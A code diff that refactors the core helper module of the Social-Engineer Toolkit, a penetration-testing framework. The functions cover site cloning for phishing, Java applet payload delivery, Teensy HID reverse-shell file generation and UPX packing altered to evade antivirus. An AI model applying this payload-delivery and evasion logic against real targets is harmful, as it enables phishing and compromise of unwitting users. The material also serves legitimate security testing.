@@ -51,18 +51,13 @@ except ImportError:
 
     print(
         "[!] The python-pycrypto python module not installed. You will lose the ability for encrypted communications.")
-    pass
 
 # get the main SET path
 
 
 def definepath():
     if check_os() == "posix":
-        if os.path.isfile("setoolkit"):
-            return os.getcwd()
-        else:
-            return "/usr/share/setoolkit/"
-
+        return os.getcwd() if os.path.isfile("setoolkit") else "/usr/share/setoolkit/"
     else:
         return os.getcwd()
 
@@ -72,7 +67,7 @@ def definepath():
 def check_os():
     if os.name == "nt":
         operating_system = "windows"
-    if os.name == "posix":
+    elif os.name == "posix":
         operating_system = "posix"
     return operating_system
 
@@ -166,36 +161,25 @@ else:
 
 
 def setprompt(category, text):
-    # if no special prompt and no text, return plain prompt
-    if category == '0' and text == "":
-        return bcolors.UNDERL + bcolors.DARKCYAN + "set" + bcolors.ENDC + "> "
-    # if the loop is here, either category or text was positive
-    # if it's the category that is blank...return prompt with only the text
     if category == '0':
-        return bcolors.UNDERL + bcolors.DARKCYAN + "set" + bcolors.ENDC + "> " + text + ": "
-    # category is NOT blank
-    else:
-        # initialize the base 'set' prompt
-        prompt = bcolors.UNDERL + bcolors.DARKCYAN + "set" + bcolors.ENDC
-        # if there is a category but no text
         if text == "":
-            for level in category:
-                level = dictionaries.category(level)
-                prompt += ":" + bcolors.UNDERL + \
-                    bcolors.DARKCYAN + level + bcolors.ENDC
-            promptstring = str(prompt)
-            promptstring += ">"
-            return promptstring
-        # if there is both a category AND text
-        else:
+            return bcolors.UNDERL + bcolors.DARKCYAN + "set" + bcolors.ENDC + "> "
+        return bcolors.UNDERL + bcolors.DARKCYAN + "set" + bcolors.ENDC + "> " + text + ": "
+    # initialize the base 'set' prompt
+    prompt = bcolors.UNDERL + bcolors.DARKCYAN + "set" + bcolors.ENDC
+        # if there is a category but no text
+    if text == "":
+        for level in category:
+            level = dictionaries.category(level)
+            prompt += f":{bcolors.UNDERL}{bcolors.DARKCYAN}{level}{bcolors.ENDC}"
+        return f"{str(prompt)}>"
+    else:
             # iterate through the list received
-            for level in category:
-                level = dictionaries.category(level)
-                prompt += ":" + bcolors.UNDERL + \
-                    bcolors.DARKCYAN + level + bcolors.ENDC
-            promptstring = str(prompt)
-            promptstring = promptstring + "> " + text + ": "
-            return promptstring
+        for level in category:
+            level = dictionaries.category(level)
+            prompt += f":{bcolors.UNDERL}{bcolors.DARKCYAN}{level}{bcolors.ENDC}"
+        promptstring = str(prompt)
+        return f"{promptstring}> {text}: "
 
 
 def yesno_prompt(category, text):
@@ -203,10 +187,10 @@ def yesno_prompt(category, text):
     while not valid_response:
         response = raw_input(setprompt(category, text))
         response = str.lower(response)
-        if response == "no" or response == "n":
+        if response in ["no", "n"]:
             response = "NO"
             valid_response = True
-        elif response == "yes" or response == "y":
+        elif response in ["yes", "y"]:
             response = "YES"
             valid_response = True
         else:
@@ -234,22 +218,19 @@ debugFrameString = '-' * 72
 
 
 def debug_msg(currentModule, message, msgType):
-    if DEBUG_LEVEL == 0:
-        pass  # stop evaluation efficiently
-    else:
+    if DEBUG_LEVEL != 0:
         if msgType <= DEBUG_LEVEL:
             # a bit more streamlined
             print(bcolors.RED + "\nDEBUG_MSG: from module '" +
                   currentModule + "': " + message + bcolors.ENDC)
 
-            if DEBUG_LEVEL == 2 or DEBUG_LEVEL == 4 or DEBUG_LEVEL == 6:
+            if DEBUG_LEVEL in [2, 4, 6]:
                 raw_input("waiting for <ENTER>\n")
 
 
 def mod_name():
     frame_records = inspect.stack()[1]
-    calling_module = inspect.getmodulename(frame_records[1])
-    return calling_module
+    return inspect.getmodulename(frame_records[1])
 
 #
 # RUNTIME MESSAGES ############
@@ -277,9 +258,7 @@ def print_error(message):
 
 
 def get_version():
-    define_version = open("src/core/set.version", "r").read().rstrip()
-    # define_version = '7.2.3'
-    return define_version
+    return open("src/core/set.version", "r").read().rstrip()
 
 
 class create_menu:
@@ -290,17 +269,14 @@ class create_menu:
         print(text)
         for i, option in enumerate(menu):
 
-            menunum = i + 1
-            # Check to see if this line has the 'return to main menu' code
-            match = re.search("0D", option)
-            # If it's not the return to menu line:
-            if not match:
-                if menunum < 10:
-                    print(('   %s) %s' % (menunum, option)))
-                else:
-                    print(('  %s) %s' % (menunum, option)))
-            else:
+            if match := re.search("0D", option):
                 print('\n  99) Return to Main Menu\n')
+            else:
+                menunum = i + 1
+                if menunum < 10:
+                    print(f'   {menunum}) {option}')
+                else:
+                    print(f'  {menunum}) {option}')
         return
 
 
@@ -318,16 +294,15 @@ def validate_ip(address):
     Validates that a given string is an IPv4 dotted quad.
     """
     try:
-        if socket.inet_aton(address):
-            if len(address.split('.')) == 4:
-                debug_msg("setcore", "this is a valid IP address", 5)
-                return True
-            else:
-                print_error("This is not a valid IP address...")
-                raise socket.error
-
-        else:
+        if not socket.inet_aton(address):
             raise socket_error
+
+        if len(address.split('.')) == 4:
+            debug_msg("setcore", "this is a valid IP address", 5)
+            return True
+        else:
+            print_error("This is not a valid IP address...")
+            raise socket.error
 
     except socket.error:
         return False
@@ -429,11 +404,9 @@ def meta_database():
     meta_path = open("/etc/setoolkit/set.config", "r").readlines()
     for line in meta_path:
         line = line.rstrip()
-        match = re.search("METASPLOIT_DATABASE=", line)
-        if match:
+        if match := re.search("METASPLOIT_DATABASE=", line):
             line = line.replace("METASPLOIT_DATABASE=", "")
-            msf_database = line.rstrip()
-            return msf_database
+            return line.rstrip()
 
 
 #
@@ -442,7 +415,12 @@ def meta_database():
 def grab_ipaddress():
     try:
         revipaddr = detect_public_ip()
-        rhost = raw_input(setprompt("0", "IP address or URL (www.ex.com) for the payload listener (LHOST) [" + revipaddr + "]"))
+        rhost = raw_input(
+            setprompt(
+                "0",
+                f"IP address or URL (www.ex.com) for the payload listener (LHOST) [{revipaddr}]",
+            )
+        )
         if rhost == "": rhost = revipaddr
 
     except Exception:
@@ -455,13 +433,18 @@ def grab_ipaddress():
                 print_status("Roger that ghostrider. Using hostnames moving forward (hostnames are 1337, nice job)..")
                 break
             else:
-                rhost = raw_input(setprompt(["2"], "IP address for the reverse connection [" + rhost + "]"))
-                if validate_ip(rhost) == True: break
-                else:
-                    choice = raw_input(setprompt(["2"], "This is not an IP address. Are you using a hostname? [y/n] "))
-                    if choice == "" or choice.lower() == "y":
-                        print_status("Roger that ghostrider. Using hostnames moving forward (hostnames are 1337, nice job)..")
-                        break
+                rhost = raw_input(
+                    setprompt(
+                        ["2"],
+                        f"IP address for the reverse connection [{rhost}]",
+                    )
+                )
+                if validate_ip(rhost) == True:
+                    if validate_ip(rhost) == True: break
+                choice = raw_input(setprompt(["2"], "This is not an IP address. Are you using a hostname? [y/n] "))
+                if choice == "" or choice.lower() == "y":
+                    print_status("Roger that ghostrider. Using hostnames moving forward (hostnames are 1337, nice job)..")
+                    break
 
     # rhost return when verified
     return rhost
@@ -472,12 +455,14 @@ def grab_ipaddress():
 def cleanup_routine():
     try:
         # restore original Java Applet
-        shutil.copyfile("%s/src/html/Signed_Update.jar.orig" %
-                        (definepath()), userconfigpath + "Signed_Update.jar")
+        shutil.copyfile(
+            f"{definepath()}/src/html/Signed_Update.jar.orig",
+            f"{userconfigpath}Signed_Update.jar",
+        )
         if os.path.isfile("newcert.pem"):
             os.remove("newcert.pem")
-        if os.path.isfile(userconfigpath + "interfaces"):
-            os.remove(userconfigpath + "interfaces")
+        if os.path.isfile(f"{userconfigpath}interfaces"):
+            os.remove(f"{userconfigpath}interfaces")
         if os.path.isfile("src/html/1msf.raw"):
             os.remove("src/html/1msf.raw")
         if os.path.isfile("src/html/2msf.raw"):
@@ -486,10 +471,10 @@ def cleanup_routine():
             os.remove("msf.exe")
         if os.path.isfile("src/html/index.html"):
             os.remove("src/html/index.html")
-        if os.path.isfile(userconfigpath + "Signed_Update.jar"):
-            os.remove(userconfigpath + "Signed_Update.jar")
-        if os.path.isfile(userconfigpath + "version.lock"):
-            os.remove(userconfigpath + "version.lock")
+        if os.path.isfile(f"{userconfigpath}Signed_Update.jar"):
+            os.remove(f"{userconfigpath}Signed_Update.jar")
+        if os.path.isfile(f"{userconfigpath}version.lock"):
+            os.remove(f"{userconfigpath}version.lock")
         src.core.minifakedns.stop_dns_server()
     except:
         pass
@@ -508,13 +493,8 @@ def update_set():
             "You are running BackBox Linux which already implements SET updates.")
         print_status(
             "No need for further operations, just update your system.")
-        time.sleep(2)
-
     elif kali == "Kali":
         print_status("You are running Kali Linux which maintains SET updates.")
-        time.sleep(2)
-
-    # if we aren't running Kali or BackBox :(
     else:
         print_info("Kali or BackBox Linux not detected, manually updating..")
         print_info("Updating the Social-Engineer Toolkit, be patient...")
@@ -523,7 +503,8 @@ def update_set():
         print_info("Updating... This could take a little bit...")
         subprocess.Popen("git pull", shell=True).wait()
         print_status("The updating has finished, returning to main menu..")
-        time.sleep(2)
+
+    time.sleep(2)
 
 #
 # Pull the help menu here
@@ -547,7 +528,7 @@ def help_menu():
 # This is a small area to generate the date and time
 #
 def date_time():
-    now = str(datetime.datetime.today())
+    now = str(datetime.datetime.now())
     return now
 
 #
@@ -569,21 +550,16 @@ def generate_random_string(low, high):
 def site_cloner(website, exportpath, *args):
     grab_ipaddress()
     ipaddr = grab_ipaddress()
-    filewrite = open(userconfigpath + "interface", "w")
-    filewrite.write(ipaddr)
-    filewrite.close()
-    filewrite = open(userconfigpath + "ipaddr", "w")
-    filewrite.write(ipaddr)
-    filewrite.close()
-    filewrite = open(userconfigpath + "site.template", "w")
-    filewrite.write("URL=" + website)
-    filewrite.close()
+    with open(f"{userconfigpath}interface", "w") as filewrite:
+        filewrite.write(ipaddr)
+    with open(f"{userconfigpath}ipaddr", "w") as filewrite:
+        filewrite.write(ipaddr)
+    with open(f"{userconfigpath}site.template", "w") as filewrite:
+        filewrite.write(f"URL={website}")
     # if we specify a second argument this means we want to use java applet
     if args[0] == "java":
-        # needed to define attack vector
-        filewrite = open(userconfigpath + "attack_vector", "w")
-        filewrite.write("java")
-        filewrite.close()
+        with open(f"{userconfigpath}attack_vector", "w") as filewrite:
+            filewrite.write("java")
     sys.path.append("src/webattack/web_clone")
     # if we are using menu mode we reload just in case
     try:
@@ -595,9 +571,13 @@ def site_cloner(website, exportpath, *args):
         import cloner
 
     # copy the file to a new folder
-    print_status("Site has been successfully cloned and is: " + exportpath)
-    subprocess.Popen("mkdir '%s';cp %s/web_clone/* '%s'" % (exportpath, userconfigpath,
-                                                            exportpath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+    print_status(f"Site has been successfully cloned and is: {exportpath}")
+    subprocess.Popen(
+        f"mkdir '{exportpath}';cp {userconfigpath}/web_clone/* '{exportpath}'",
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        shell=True,
+    ).wait()
 
 
 #
@@ -676,17 +656,24 @@ def java_applet_attack(website, port, directory):
     if check_options != 0:
 
         # move the file to the specified directory and filename
-        subprocess.Popen("cp %s/msf.exe %s/%s" % (userconfigpath, directory, filename),
-                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+        subprocess.Popen(
+            f"cp {userconfigpath}/msf.exe {directory}/{filename}",
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            shell=True,
+        ).wait()
 
     applet_name = check_options("APPLET_NAME=")
     if applet_name == "":
-        applet_name = generate_random_string(6, 15) + ".jar"
+        applet_name = f"{generate_random_string(6, 15)}.jar"
 
     # lastly we need to copy over the signed applet
     subprocess.Popen(
-        "cp %s/Signed_Update.jar %s/%s" % (userconfigpath, directory, applet_name),
-                     stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+        f"cp {userconfigpath}/Signed_Update.jar {directory}/{applet_name}",
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        shell=True,
+    ).wait()
 
     # start the web server by running it in the background
     start_web_server(directory)
@@ -710,48 +697,42 @@ def teensy_pde_generator(attack_method):
     if attack_method == "beef":
         # specify the filename
         filename = open("src/teensy/beef.ino", "r")
-        filewrite = open(userconfigpath + "reports/beef.ino", "w")
-        teensy_string = (
-            "Successfully generated Teensy HID Beef Attack Vector under %s/reports/beef.ino" % (userconfigpath))
+        filewrite = open(f"{userconfigpath}reports/beef.ino", "w")
+        teensy_string = f"Successfully generated Teensy HID Beef Attack Vector under {userconfigpath}/reports/beef.ino"
 
     # if we are doing the attack vector teensy beef
     if attack_method == "powershell_down":
         # specify the filename
         filename = open("src/teensy/powershell_down.ino", "r")
-        filewrite = open(userconfigpath + "reports/powershell_down.ino", "w")
-        teensy_string = (
-            "Successfully generated Teensy HID Attack Vector under %s/reports/powershell_down.ino" % (userconfigpath))
+        filewrite = open(f"{userconfigpath}reports/powershell_down.ino", "w")
+        teensy_string = f"Successfully generated Teensy HID Attack Vector under {userconfigpath}/reports/powershell_down.ino"
 
     # if we are doing the attack vector teensy
     if attack_method == "powershell_reverse":
         # specify the filename
         filename = open("src/teensy/powershell_reverse.ino", "r")
-        filewrite = open(userconfigpath + "reports/powershell_reverse.ino", "w")
-        teensy_string = (
-            "Successfully generated Teensy HID Attack Vector under %s/reports/powershell_reverse.ino" % (userconfigpath))
+        filewrite = open(f"{userconfigpath}reports/powershell_reverse.ino", "w")
+        teensy_string = f"Successfully generated Teensy HID Attack Vector under {userconfigpath}/reports/powershell_reverse.ino"
 
     # if we are doing the attack vector teensy beef
     if attack_method == "java_applet":
         # specify the filename
         filename = open("src/teensy/java_applet.ino", "r")
-        filewrite = open(userconfigpath + "reports/java_applet.ino", "w")
-        teensy_string = (
-            "Successfully generated Teensy HID Attack Vector under %s/reports/java_applet.ino" % (userconfigpath))
+        filewrite = open(f"{userconfigpath}reports/java_applet.ino", "w")
+        teensy_string = f"Successfully generated Teensy HID Attack Vector under {userconfigpath}/reports/java_applet.ino"
 
     # if we are doing the attack vector teensy
     if attack_method == "wscript":
         # specify the filename
         filename = open("src/teensy/wscript.ino", "r")
-        filewrite = open(userconfigpath + "reports/wscript.ino", "w")
-        teensy_string = (
-            "Successfully generated Teensy HID Attack Vector under %s/reports/wscript.ino" % (userconfigpath))
+        filewrite = open(f"{userconfigpath}reports/wscript.ino", "w")
+        teensy_string = f"Successfully generated Teensy HID Attack Vector under {userconfigpath}/reports/wscript.ino"
 
     # All the options share this code except binary2teensy
     if attack_method != "binary2teensy":
         for line in filename:
             line = line.rstrip()
-            match = re.search("IPADDR", line)
-            if match:
+            if match := re.search("IPADDR", line):
                 line = line.replace("IPADDR", ipaddr)
             filewrite.write(line)
 
@@ -759,8 +740,7 @@ def teensy_pde_generator(attack_method):
     if attack_method == "binary2teensy":
         # specify the filename
         import src.teensy.binary2teensy
-        teensy_string = (
-            "Successfully generated Teensy HID Attack Vector under %s/reports/binary2teensy.ino" % (userconfigpath))
+        teensy_string = f"Successfully generated Teensy HID Attack Vector under {userconfigpath}/reports/binary2teensy.ino"
 
     print_status(teensy_string)
 #
@@ -780,20 +760,14 @@ def log(error):
     try:
         # open log file only if directory is present (may be out of directory
         # for some reason)
-        if not os.path.isfile("%s/src/logs/set_logfile.log" % (definepath())):
-            filewrite = open("%s/src/logs/set_logfile.log" %
-                             (definepath()), "w")
-            filewrite.write("")
-            filewrite.close()
-        if os.path.isfile("%s/src/logs/set_logfile.log" % (definepath())):
+        if not os.path.isfile(f"{definepath()}/src/logs/set_logfile.log"):
+            with open(f"{definepath()}/src/logs/set_logfile.log", "w") as filewrite:
+                filewrite.write("")
+        if os.path.isfile(f"{definepath()}/src/logs/set_logfile.log"):
             error = str(error)
-            # open file for writing
-            filewrite = open("%s/src/logs/set_logfile.log" %
-                             (definepath()), "a")
-            # write error message out
-            filewrite.write("ERROR: " + date_time() + ": " + error + "\n")
-            # close the file
-            filewrite.close()
+            with open(f"{definepath()}/src/logs/set_logfile.log", "a") as filewrite:
+                            # write error message out
+                filewrite.write(f"ERROR: {date_time()}: {error}" + "\n")
     except IOError as err:
         pass
 #
@@ -806,8 +780,7 @@ def upx(path_to_file):
     fileopen = open("/etc/setoolkit/set.config", "r")
     for line in fileopen:
         line = line.rstrip()
-        match = re.search("UPX_PATH=", line)
-        if match:
+        if match := re.search("UPX_PATH=", line):
             upx_path = line.replace("UPX_PATH=", "")
 
     # if it isn't there then bomb out
@@ -821,27 +794,36 @@ def upx(path_to_file):
             "Packing the executable and obfuscating PE file randomly, one moment.")
         # packing executable
         subprocess.Popen(
-            "%s -9 -q -o %s/temp.binary %s" % (upx_path, userconfigpath, path_to_file),
-                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+            f"{upx_path} -9 -q -o {userconfigpath}/temp.binary {path_to_file}",
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            shell=True,
+        ).wait()
         # move it over the old file
-        subprocess.Popen("mv %s/temp.binary %s" % (userconfigpath, path_to_file),
-                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+        subprocess.Popen(
+            f"mv {userconfigpath}/temp.binary {path_to_file}",
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            shell=True,
+        ).wait()
 
         # random string
         random_string = generate_random_string(3, 3).upper()
 
         # 4 upx replace - we replace 4 upx open the file
         fileopen = open(path_to_file, "rb")
-        filewrite = open(userconfigpath + "temp.binary", "wb")
-
-        # read the file open for data
-        data = fileopen.read()
-        # replace UPX stub makes better evasion for A/V
-        filewrite.write(data.replace("UPX", random_string, 4))
-        filewrite.close()
+        with open(f"{userconfigpath}temp.binary", "wb") as filewrite:
+            # read the file open for data
+            data = fileopen.read()
+            # replace UPX stub makes better evasion for A/V
+            filewrite.write(data.replace("UPX", random_string, 4))
         # copy the file over
-        subprocess.Popen("mv %s/temp.binary %s" % (userconfigpath, path_to_file),
-                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+        subprocess.Popen(
+            f"mv {userconfigpath}/temp.binary {path_to_file}",
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            shell=True,
+        ).wait()
     time.sleep(3)
 
 
@@ -856,17 +838,99 @@ def show_banner(define_version, graphic):
     else:
         os.system("clear")
 
-    print(bcolors.BLUE + """
-[---]        The Social-Engineer Toolkit (""" + bcolors.YELLOW + """SET""" + bcolors.BLUE + """)         [---]
-[---]        Created by:""" + bcolors.RED + """ David Kennedy """ + bcolors.BLUE + """(""" + bcolors.YELLOW + """ReL1K""" + bcolors.BLUE + """)         [---]
-                      Version: """ + bcolors.RED + """%s""" % (define_version) + bcolors.BLUE + """
-                    Codename: '""" + bcolors.YELLOW + """Maverick""" + bcolors.ENDC + bcolors.BLUE + """'
-[---]        Follow us on Twitter: """ + bcolors.PURPLE + """@TrustedSec""" + bcolors.BLUE + """         [---]
-[---]        Follow me on Twitter: """ + bcolors.PURPLE + """@HackingDave""" + bcolors.BLUE + """        [---]
-[---]       Homepage: """ + bcolors.YELLOW + """https://www.trustedsec.com""" + bcolors.BLUE + """       [---]
-""" + bcolors.GREEN + """        Welcome to the Social-Engineer Toolkit (SET).
+    print(
+        (
+            (
+                (
+                    (
+                        (
+                            (
+                                (
+                                    (
+                                        (
+                                            (
+                                                (
+                                                    (
+                                                        (
+                                                            (
+                                                                (
+                                                                    (
+                                                                        (
+                                                                            (
+                                                                                (
+                                                                                    (
+                                                                                        (
+                                                                                            (
+                                                                                                bcolors.BLUE
+                                                                                                + """
+[---]        The Social-Engineer Toolkit ("""
+                                                                                                + bcolors.YELLOW
+                                                                                                + """SET"""
+                                                                                                + bcolors.BLUE
+                                                                                                + """)         [---]
+[---]        Created by:"""
+                                                                                                + bcolors.RED
+                                                                                                + """ David Kennedy """
+                                                                                                + bcolors.BLUE
+                                                                                                + """("""
+                                                                                                + bcolors.YELLOW
+                                                                                                + """ReL1K"""
+                                                                                                + bcolors.BLUE
+                                                                                                + """)         [---]
+                      Version: """
+                                                                                                + bcolors.RED
+                                                                                                + f"""{define_version}"""
+                                                                                            )
+                                                                                            + bcolors.BLUE
+                                                                                        )
+                                                                                        + """
+                    Codename: '"""
+                                                                                    )
+                                                                                    + bcolors.YELLOW
+                                                                                )
+                                                                                + """Maverick"""
+                                                                            )
+                                                                            + bcolors.ENDC
+                                                                        )
+                                                                        + bcolors.BLUE
+                                                                    )
+                                                                    + """'
+[---]        Follow us on Twitter: """
+                                                                )
+                                                                + bcolors.PURPLE
+                                                            )
+                                                            + """@TrustedSec"""
+                                                        )
+                                                        + bcolors.BLUE
+                                                    )
+                                                    + """         [---]
+[---]        Follow me on Twitter: """
+                                                )
+                                                + bcolors.PURPLE
+                                            )
+                                            + """@HackingDave"""
+                                        )
+                                        + bcolors.BLUE
+                                    )
+                                    + """        [---]
+[---]       Homepage: """
+                                )
+                                + bcolors.YELLOW
+                            )
+                            + """https://www.trustedsec.com"""
+                        )
+                        + bcolors.BLUE
+                    )
+                    + """       [---]
+"""
+                )
+                + bcolors.GREEN
+            )
+            + """        Welcome to the Social-Engineer Toolkit (SET).
          The one stop shop for all of your SE needs.
-""")
+"""
+        )
+    )
     print(bcolors.BOLD + """   The Social-Engineer Toolkit is a product of TrustedSec.\n\n           Visit: """ +
           bcolors.GREEN + """https://www.trustedsec.com\n""" + bcolors.ENDC)
     print(bcolors.BLUE + """   It's easy to update using the PenTesters Framework! (PTF)\nVisit """ + bcolors.YELLOW +
@@ -881,21 +945,19 @@ def show_banner(define_version, graphic):
         version = ""
 
         def pull_version():
-            if not os.path.isfile(userconfigpath + "version.lock"):
+            if not os.path.isfile(f"{userconfigpath}version.lock"):
                 try:
 
                     url = (
                         'https://raw.githubusercontent.com/trustedsec/social-engineer-toolkit/master/src/core/set.version')
                     version = urlopen(url).read().rstrip().decode('utf-8')
-                    filewrite = open(userconfigpath + "version.lock", "w")
-                    filewrite.write(version)
-                    filewrite.close()
-
+                    with open(f"{userconfigpath}version.lock", "w") as filewrite:
+                        filewrite.write(version)
                 except KeyboardInterrupt:
                     version = "keyboard interrupt"
 
             else:
-                version = open(userconfigpath + "version.lock", "r").read()
+                version = open(f"{userconfigpath}version.lock", "r").read()
 
             if cv != version:
                 if version != "":
@@ -945,91 +1007,6 @@ def show_graphic():
                 \/         \/            """ + bcolors.ENDC)
         return
 
-    if menu == 4:
-        print(bcolors.BLUE + r"""
-            :::===  :::===== :::====
-            :::     :::      :::====
-             =====  ======     ===
-                === ===        ===
-            ======  ========   ===
-""" + bcolors.ENDC)
-
-    if menu == 5:
-        print(bcolors.RED + r"""
-           ..######..########.########
-           .##....##.##..........##...
-           .##.......##..........##...
-           ..######..######......##...
-           .......##.##..........##...
-           .##....##.##..........##...
-           ..######..########....##...  """ + bcolors.ENDC)
-        return
-
-    if menu == 6:
-        print(bcolors.PURPLE + r'''
-         .M"""bgd `7MM"""YMM MMP""MM""YMM
-        ,MI    "Y   MM    `7 P'   MM   `7
-        `MMb.       MM   d        MM
-          `YMMNq.   MMmmMM        MM
-        .     `MM   MM   Y  ,     MM
-        Mb     dM   MM     ,M     MM
-        P"Ybmmd"  .JMMmmmmMMM   .JMML.''' + bcolors.ENDC)
-        return
-
-    if menu == 7:
-        print(bcolors.YELLOW + r"""
-              ________________________
-              __  ___/__  ____/__  __/
-              _____ \__  __/  __  /
-              ____/ /_  /___  _  /
-              /____/ /_____/  /_/     """ + bcolors.ENDC)
-        return
-
-    if menu == 8:
-        print(bcolors.RED + r'''
-          !\_________________________/!\
-          !!                         !! \
-          !! Social-Engineer Toolkit !!  \
-          !!                         !!  !
-          !!          Free           !!  !
-          !!                         !!  !
-          !!          #hugs          !!  !
-          !!                         !!  !
-          !!      By: TrustedSec     !!  /
-          !!_________________________!! /
-          !/_________________________\!/
-             __\_________________/__/!_
-            !_______________________!/
-          ________________________
-         /oooo  oooo  oooo  oooo /!
-        /ooooooooooooooooooooooo/ /
-       /ooooooooooooooooooooooo/ /
-      /C=_____________________/_/''' + bcolors.ENDC)
-
-    if menu == 9:
-        print(bcolors.YELLOW + """
-         01011001011011110111010100100000011100
-         10011001010110000101101100011011000111
-         10010010000001101000011000010111011001
-         10010100100000011101000110111100100000
-         01101101011101010110001101101000001000
-         00011101000110100101101101011001010010
-         00000110111101101110001000000111100101
-         10111101110101011100100010000001101000
-         01100001011011100110010001110011001000
-         00001110100010110100101001001000000101
-         01000110100001100001011011100110101101
-         11001100100000011001100110111101110010
-         00100000011101010111001101101001011011
-         10011001110010000001110100011010000110
-         01010010000001010011011011110110001101
-         10100101100001011011000010110101000101
-         01101110011001110110100101101110011001
-         01011001010111001000100000010101000110
-         11110110111101101100011010110110100101
-         11010000100000001010100110100001110101
-         011001110111001100101010""" + bcolors.ENDC)
-
     if menu == 10:
         print(bcolors.GREEN + """
                           .  ..
@@ -1055,7 +1032,7 @@ def show_graphic():
                        ,MMMMMMMMMMM
                 https://www.trustedsec.com""" + bcolors.ENDC)
 
-    if menu == 11:
+    elif menu == 11:
         print(bcolors.backBlue + r"""
                           _                                           J
                          /-\                                          J
@@ -1079,7 +1056,7 @@ def show_graphic():
                  |   Timey Wimey   |                                  !
                  -------------------                                  !""" + bcolors.ENDC)
 
-    if menu == 12:
+    elif menu == 12:
         print(bcolors.YELLOW + r'''
            ,..-,
          ,;;f^^"""-._
@@ -1109,7 +1086,7 @@ def show_graphic():
            |______________________________________|
 	''')
 
-    if menu == 13:
+    elif menu == 13:
         print(bcolors.RED + r"""
                       ..:::::::::..
                   ..:::aad8888888baa:::..
@@ -1133,7 +1110,7 @@ def show_graphic():
                  ``:::::::::::::::::::''
                       ``:::::::::''""" + bcolors.ENDC)
 
-    if menu == 14:
+    elif menu == 14:
         print(bcolors.BOLD + """
 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
@@ -1198,6 +1175,90 @@ XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
                                                                 .o...P'
                                                                 `XER0'
 """ + bcolors.ENDC)
+    elif menu == 4:
+        print(bcolors.BLUE + r"""
+            :::===  :::===== :::====
+            :::     :::      :::====
+             =====  ======     ===
+                === ===        ===
+            ======  ========   ===
+""" + bcolors.ENDC)
+
+    elif menu == 5:
+        print(bcolors.RED + r"""
+           ..######..########.########
+           .##....##.##..........##...
+           .##.......##..........##...
+           ..######..######......##...
+           .......##.##..........##...
+           .##....##.##..........##...
+           ..######..########....##...  """ + bcolors.ENDC)
+        return
+
+    elif menu == 6:
+        print(bcolors.PURPLE + r'''
+         .M"""bgd `7MM"""YMM MMP""MM""YMM
+        ,MI    "Y   MM    `7 P'   MM   `7
+        `MMb.       MM   d        MM
+          `YMMNq.   MMmmMM        MM
+        .     `MM   MM   Y  ,     MM
+        Mb     dM   MM     ,M     MM
+        P"Ybmmd"  .JMMmmmmMMM   .JMML.''' + bcolors.ENDC)
+        return
+
+    elif menu == 7:
+        print(bcolors.YELLOW + r"""
+              ________________________
+              __  ___/__  ____/__  __/
+              _____ \__  __/  __  /
+              ____/ /_  /___  _  /
+              /____/ /_____/  /_/     """ + bcolors.ENDC)
+        return
+
+    elif menu == 8:
+        print(bcolors.RED + r'''
+          !\_________________________/!\
+          !!                         !! \
+          !! Social-Engineer Toolkit !!  \
+          !!                         !!  !
+          !!          Free           !!  !
+          !!                         !!  !
+          !!          #hugs          !!  !
+          !!                         !!  !
+          !!      By: TrustedSec     !!  /
+          !!_________________________!! /
+          !/_________________________\!/
+             __\_________________/__/!_
+            !_______________________!/
+          ________________________
+         /oooo  oooo  oooo  oooo /!
+        /ooooooooooooooooooooooo/ /
+       /ooooooooooooooooooooooo/ /
+      /C=_____________________/_/''' + bcolors.ENDC)
+
+    elif menu == 9:
+        print(bcolors.YELLOW + """
+         01011001011011110111010100100000011100
+         10011001010110000101101100011011000111
+         10010010000001101000011000010111011001
+         10010100100000011101000110111100100000
+         01101101011101010110001101101000001000
+         00011101000110100101101101011001010010
+         00000110111101101110001000000111100101
+         10111101110101011100100010000001101000
+         01100001011011100110010001110011001000
+         00001110100010110100101001001000000101
+         01000110100001100001011011100110101101
+         11001100100000011001100110111101110010
+         00100000011101010111001101101001011011
+         10011001110010000001110100011010000110
+         01010010000001010011011011110110001101
+         10100101100001011011000010110101000101
+         01101110011001110110100101101110011001
+         01011001010111001000100000010101000110
+         11110110111101101100011010110110100101
+         11010000100000001010100110100001110101
+         011001110111001100101010""" + bcolors.ENDC)
 
 #
 # identify if set interactive shells are disabled
@@ -1207,13 +1268,9 @@ XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 def set_check():
     fileopen = open("/etc/setoolkit/set.config", "r")
     for line in fileopen:
-        match = re.search("SET_INTERACTIVE_SHELL=OFF", line)
-        # if we turned it off then we return a true else return false
-        if match:
+        if match := re.search("SET_INTERACTIVE_SHELL=OFF", line):
             return True
-        match1 = re.search("SET_INTERACTIVE_SHELL=ON", line)
-        # return false otherwise
-        if match1:
+        if match1 := re.search("SET_INTERACTIVE_SHELL=ON", line):
             return False
 
 # if the user specifies 99
@@ -1232,7 +1289,7 @@ def custom_template():
             "Always looking for new templates! In the set/src/templates directory send an email\nto info@trustedsec.com if you got a good template!")
         author = raw_input(setprompt("0", "Enter the name of the author"))
         filename = randomgen = random.randrange(1, 99999999999999999999)
-        filename = str(filename) + (".template")
+        filename = f"{filename}.template"
         subject = raw_input(setprompt("0", "Enter the subject of the email"))
         try:
             body = raw_input(setprompt(
